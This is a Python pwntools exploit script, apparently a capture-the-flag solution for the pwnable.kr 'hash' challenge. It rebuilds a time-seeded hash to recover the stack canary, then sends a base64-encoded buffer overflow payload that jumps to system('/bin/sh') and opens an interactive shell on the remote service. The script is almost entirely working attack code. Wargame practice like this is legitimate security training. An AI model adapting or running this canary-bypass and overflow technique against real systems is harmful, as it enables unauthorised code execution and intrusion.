import math
from pwn import *
import subprocess
from pathlib import Path
from encodings.base64_codec import base64_encode
from datetime import datetime, timedelta, timezone


BASE_PATH = Path(__file__).parent
CALCULATE_HASH_BINARY = Path(BASE_PATH, Path('calculate_hash', 'calculate_hash'))
EXPLOITABLE_BINARY = Path(BASE_PATH, Path('hash'))

# /bin/sh converted to bytes
SHELL_COMMAND = b'/bin/sh\x00'   

EBP_ADDRESS = 0xffffd168
BUFFER_SIZE = 0x200

ESP_ADDRESS_BEFORE_SYSTEM_CALLED = 0xffffd170

# Add 4 since the pointer to the shell command is also stored
# in the stack
SHELL_COMMAND_ADDRESS = ESP_ADDRESS_BEFORE_SYSTEM_CALLED + 4

SYSTEM_CALL_ADDRESS = 0x8049187

def calculate_hash(time_diff: int) -> int:
    """
    Calculates a custom hash (exactly like the binary does) without the canary.
    """
    time = math.floor(datetime.now().timestamp() + time_diff)
    popen = subprocess.Popen([CALCULATE_HASH_BINARY, str(time)], stdout=subprocess.PIPE)
    result, _ = popen.communicate()

    return int(result.decode())

def calculate_canary(original_hash: int, time_diff: int = 0) -> int:
    return (original_hash - calculate_hash(time_diff)) & 0xFFFFFFFF

def main() -> None:
    for time_diff in range(-2, 1):
        # Get the original hash
        connection = remote('pwnable.kr', 9002)
        # connection = process(str(EXPLOITABLE_BINARY))
        
        print(connection.readuntil(':'))
        original_hash = int(connection.read().decode().strip())

        # Calculate the canary value
        canary = calculate_canary(original_hash, time_diff)

        # Response to the captcha
        connection.sendline(str(original_hash).encode())

        # Craft the payload and send it
        payload = b'A' * BUFFER_SIZE + p32(canary) + 12 * b'A' + p32(SYSTEM_CALL_ADDRESS) + p32(SHELL_COMMAND_ADDRESS) + SHELL_COMMAND
        payload = base64_encode(payload)[0].decode().replace('\n', '')
        connection.sendline(payload)

        message = connection.recvall().decode()
        if 'stack smashing detected' not in message:
            # Make interactive to get the gained shell :)
            connection.interactive()
            print(f'Received message for {time_diff}')
            break
        else:
            print(f'with diff {time_diff}: Stack smashing detected :(')


if __name__ == '__main__':
    main()
